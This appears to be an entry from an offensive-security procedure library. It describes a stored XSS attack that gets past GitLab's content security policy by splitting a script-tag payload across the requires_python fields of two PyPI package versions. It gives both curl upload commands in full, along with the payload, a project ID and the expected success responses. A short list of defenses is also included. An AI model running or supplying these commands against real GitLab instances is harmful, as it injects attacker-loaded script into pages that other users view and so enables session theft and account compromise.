---
id: proc-upload-split-csp-bypass
tags:
  - csp-bypass
  - xss
  - split-payload
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-upload-pypi-csp-v1]]'
  - '[[commands/curl-upload-pypi-csp-v2]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:20.492Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Upload-Split-Payload-for-CSP-Bypass

## Summary

This procedure bypasses GitLab's CSP by uploading two versions of the same PyPi package, splitting the script payload across requires_python fields, which concatenate in the simple endpoint's HTML to form a complete <script src=...> tag loading an external allowed script.

## Description

CSP on GitLab.com blocks inline scripts but allows same-origin loads. By splitting '"><script src=/vakzz-h1/public/-/raw/a/test.js>' (v1) and ' </script>' (v2), the endpoint's version list concatenates them into a valid tag, evading inline detection. This exploits the lack of per-attribute sanitization and version aggregation in rendering.

## Requirements

1. GitLab project ID and token
2. Dummy file /tmp/lala.txt
3. Access to host external JS (e.g., in a project raw file)

## Defense

Defensive measures and detection strategies:

- Sanitize requires_python per version, not concatenated
- Detect multi-version uploads with similar payloads
- Audit CSP for external src allowances

## Objectives

1. Split payload to evade single-field length and CSP checks
2. Concatenate via endpoint rendering
3. Load external JS from permitted domain

## Instructions

### Step 1: Upload Version 1

**Context**: Inject opening payload.

**Command** ([[commands/curl-upload-pypi-csp-v1]]):
```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_csp_bypass' -F requires_python='"><script src=/vakzz-h1/public/-/raw/a/test.js>'
```

> Success: 201 response.

### Step 2: Upload Version 2

**Context**: Add closing tag to complete script.

**Command** ([[commands/curl-upload-pypi-csp-v2]]):
```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=2 -F name='package_csp_bypass' -F requires_python=' </script>'
```

> Success: 201. Now visit simple endpoint to see concatenation.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-pypi-csp-v1]]
- [[commands/curl-upload-pypi-csp-v2]]

## Tools Used

- [[tools/curl]]

## Tags

- [[csp-bypass]]
- [[xss]]
- [[split-payload]]
